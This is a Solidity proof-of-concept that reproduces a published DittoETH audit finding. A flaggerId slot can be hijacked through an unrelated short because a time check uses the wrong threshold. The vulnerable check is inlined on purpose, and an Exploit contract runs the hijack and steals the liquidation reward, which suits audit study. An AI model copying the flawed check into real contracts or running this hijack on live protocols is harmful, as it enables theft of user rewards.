// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    DittoETH — Flag can be overridden by another user (Codehawks 2023-09,
    reporter serialcoder, finding #27465)

    SYNTHETIC, CHEATCODE-FREE reproduction for the EVM Playground. The
    vulnerable LibShortRecord::setFlagger id-reuse branch is inlined
    VERBATIM (it compares against firstLiquidationTime instead of
    secondLiquidationTime). No fork, no RPC, no cheatcodes.

    ROOT CAUSE: a flaggerId is a GLOBAL, reusable slot (`flagMapping[id] =>
    address`); each ShortRecord just stores WHICH flaggerId number flags it.
    `setFlagger` lets a brand-new flagger reuse someone else's flaggerId
    slot once `firstLiquidationTime` hours have passed since THAT FLAGGER's
    own last update — but the original flagger is supposed to have
    EXCLUSIVE liquidation rights on THEIR flagged short until the LATER
    `secondLiquidationTime`. Because the reused flaggerId slot is shared
    globally, hijacking it via a completely UNRELATED short's flag call
    silently reassigns liquidation-reward eligibility for the FIRST
    flagger's short too — before that flagger's exclusive window has even
    ended.

    Numbers kept exact & simple (abstract units, hours):
      - Flagger1 flags Short1 first, getting a freshly-minted flaggerId.
      - 15 hours pass (past firstLiquidationTime=10, but before
        secondLiquidationTime=20 — Flagger1's exclusive window on Short1
        should still be running).
      - Flagger2 (who has never flagged anything) flags an UNRELATED
        Short2, passing Flagger1's flaggerId as a hint. The buggy time
        check lets Flagger2 take over that flaggerId slot.
      - Flagger1 can no longer liquidate Short1 (his own flagged short!).
      - Flagger2 CAN liquidate Short1 and collects its 100-unit liquidation
        reward — despite never having flagged Short1 at all.
//////////////////////////////////////////////////////////////////////////*/

/// @dev Minimal ERC20 used as the liquidation reward asset.
contract MockToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "ERC20: insufficient balance");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Reduction of DittoETH's LibShortRecord::setFlagger +
///         MarginCallPrimaryFacet::flagShort + MarginCallSecondaryFacet's
///         liquidation-eligibility gate. Collateral-ratio-driven
///         flaggability, the full margin-call reward math, and multi-asset
///         accounting are out of scope and omitted; the exact global,
///         reusable flaggerId slot and the wrong-threshold time check this
///         finding blames are preserved.
contract MarginCallManager {
    struct ShortRecord {
        uint256 flaggerId; // 0 = not flagged
    }

    struct UserFlagState {
        uint256 g_flaggerId; // the flaggerId slot this user currently HOLDS (0 = none)
        uint256 g_updatedAt; // when this user was last assigned that slot
    }

    uint256 public constant FIRST_LIQUIDATION_TIME = 10; // hours - flagger's exclusive window (buggy check target)
    uint256 public constant SECOND_LIQUIDATION_TIME = 20; // hours - when ANYONE should be allowed to take over
    uint256 public constant LIQUIDATION_REWARD = 100;

    MockToken public token;
    mapping(uint256 => ShortRecord) public shortRecords; // shortId => SR
    mapping(uint256 => address) public flagMapping; // flaggerId => the address currently holding that slot
    mapping(address => UserFlagState) public flagState;
    uint256 public flaggerIdCounter;
    uint256 public offsetTime; // mirrors LibOrders.getOffsetTimeHours() - a plain counter, no cheatcodes

    constructor(MockToken _token) {
        token = _token;
    }

    /// @notice Reduction of MarginCallPrimaryFacet::flagShort ->
    ///         LibShortRecord::setFlagger.
    function flagShort(uint256 shortId, uint16 flaggerHint) external {
        ShortRecord storage sr = shortRecords[shortId];
        UserFlagState storage flagStorage = flagState[msg.sender];

        if (flagStorage.g_flaggerId == 0) {
            address flaggerToReplace = flagMapping[flaggerHint];
            uint256 timeDiff =
                flaggerToReplace != address(0) ? offsetTime - flagState[flaggerToReplace].g_updatedAt : 0;

            // @dev re-use an inactive flaggerId
            if (timeDiff > FIRST_LIQUIDATION_TIME) { // @> VULN: compares against FIRST_LIQUIDATION_TIME - should be SECOND_LIQUIDATION_TIME, the point at which the ORIGINAL flagger's exclusive window actually ends
                delete flagState[flaggerToReplace].g_flaggerId;
                sr.flaggerId = flagStorage.g_flaggerId = flaggerHint;
            } else if (flaggerIdCounter < type(uint16).max) {
                sr.flaggerId = flagStorage.g_flaggerId = ++flaggerIdCounter;
            }
            flagMapping[sr.flaggerId] = msg.sender;
            flagStorage.g_updatedAt = offsetTime;
        }
    }

    function getFlagger(uint256 flaggerId) public view returns (address) {
        return flagMapping[flaggerId];
    }

    /// @notice Reduction of the flagger-exclusive-window liquidation gate
    ///         (MarginCallSecondaryFacet). Only the CURRENT holder of the
    ///         short's flaggerId slot may liquidate and collect the reward.
    function liquidate(uint256 shortId) external returns (uint256 reward) {
        ShortRecord storage sr = shortRecords[shortId];
        require(msg.sender == getFlagger(sr.flaggerId), "MarginCallIneligibleWindow");
        reward = LIQUIDATION_REWARD;
        token.transfer(msg.sender, reward);
    }

    /// @dev Test-only clock advance, mirroring how the finding's own test
    ///      harness models elapsed time — a plain counter here, not a
    ///      cheatcode.
    function __test_advanceTime(uint256 hoursElapsed) external {
        offsetTime += hoursElapsed;
    }
}

/// @notice Thin actor contract so each flagger has its own address.
contract Actor {
    MarginCallManager public mgr;

    constructor(MarginCallManager _mgr) {
        mgr = _mgr;
    }

    function flagShort(uint256 shortId, uint16 flaggerHint) external {
        mgr.flagShort(shortId, flaggerHint);
    }

    function tryLiquidate(uint256 shortId) external returns (bool success, uint256 reward) {
        try mgr.liquidate(shortId) returns (uint256 r) {
            success = true;
            reward = r;
        } catch {
            success = false;
        }
    }
}

/// @notice Attack orchestrator / deployer. Deploys the whole scene and runs
///         the flaggerId hijack end-to-end, asserting the finding's HARM
///         with require().
contract Exploit {
    uint256 public constant SHORT1 = 1;
    uint256 public constant SHORT2 = 2;

    MockToken public token; // CREATE nonce 1
    MarginCallManager public mgr; // CREATE nonce 2 (vulnerable)
    Actor public flagger1; // CREATE nonce 3 (rightfully flags Short1)
    Actor public flagger2; // CREATE nonce 4 (hijacks the flaggerId via an unrelated Short2)

    bool public flagger1LiquidateSucceeded;
    bool public flagger2LiquidateSucceeded;
    uint256 public flagger2Reward;

    constructor() {
        token = new MockToken();
        mgr = new MarginCallManager(token);
        flagger1 = new Actor(mgr);
        flagger2 = new Actor(mgr);
        token.mint(address(mgr), 1000); // liquidation reward pool
    }

    function run() external {
        // 1. Flagger1 flags Short1 first - gets a freshly-minted flaggerId.
        flagger1.flagShort(SHORT1, 0);
        (uint256 short1FlaggerId) = mgr.shortRecords(SHORT1);
        require(short1FlaggerId != 0, "short1 not flagged");
        require(mgr.getFlagger(short1FlaggerId) == address(flagger1), "flagger1 does not hold the slot yet");

        // 2. 15 hours pass - past FIRST_LIQUIDATION_TIME(10) but before
        //    SECOND_LIQUIDATION_TIME(20). Flagger1's exclusive window on
        //    Short1 should still be running.
        mgr.__test_advanceTime(15);

        // 3. Flagger2 flags an UNRELATED Short2, passing Flagger1's
        //    flaggerId as the hint. The buggy time check lets him take over.
        flagger2.flagShort(SHORT2, uint16(short1FlaggerId));

        // ---- HARM: Short1's flaggerId slot is now held by Flagger2, who
        //      never touched Short1 at all ----
        require(mgr.getFlagger(short1FlaggerId) == address(flagger2), "flaggerId slot was not hijacked");

        // ---- HARM: Flagger1 can no longer liquidate his OWN flagged short ----
        (flagger1LiquidateSucceeded,) = flagger1.tryLiquidate(SHORT1);
        require(!flagger1LiquidateSucceeded, "flagger1 could still liquidate - bug not triggered");

        // ---- HARM: Flagger2 CAN liquidate Short1 and steals its reward ----
        (flagger2LiquidateSucceeded, flagger2Reward) = flagger2.tryLiquidate(SHORT1);
        require(flagger2LiquidateSucceeded, "flagger2 could not liquidate short1");
        require(flagger2Reward == mgr.LIQUIDATION_REWARD(), "stolen reward amount mismatch");
        require(token.balanceOf(address(flagger2)) == mgr.LIQUIDATION_REWARD(), "flagger2 did not receive the reward");
    }
}
